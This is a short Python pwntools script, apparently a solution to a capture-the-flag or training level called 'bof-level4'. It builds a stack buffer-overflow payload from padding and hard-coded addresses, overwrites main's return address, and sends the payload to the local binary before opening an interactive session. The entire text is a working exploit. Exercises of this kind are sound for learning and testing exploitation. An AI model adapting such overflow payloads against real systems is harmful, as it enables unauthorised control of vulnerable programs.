#!/usr/bin/env python
import sys

from pwn import *

context.terminal = "/bin/bash"

# stack frame:
# [ stored ebp]
# [ ebp - 4 ]
# [ ebp - 8 ]
# [ ebp - c ]
# [ ebp - 10 ]
# [ ebp - 14 ]
# [ ebp - 18 ]
# [ ebp - 1c ]
# [ ebp - 20 ]

buf = "AAAA" + p32(0x8048530) + "A" * 0xc
buf += "ABCDEFGH"
buf += p32(0xffffd528)
buf += p32(0xffffd528)
buf += p32(0x804876b)
# we can just write past and overwrite the return address of main
buf += p32(0x8048530)
buf += p32(0x8048530)
buf += p32(0x8048530)
buf += p32(0x8048530)

p = process("./bof-level4")

if (len(sys.argv) > 1 and sys.argv[1] == "g"):
    gdb.attach(p)

p.sendline(buf)

p.interactive()
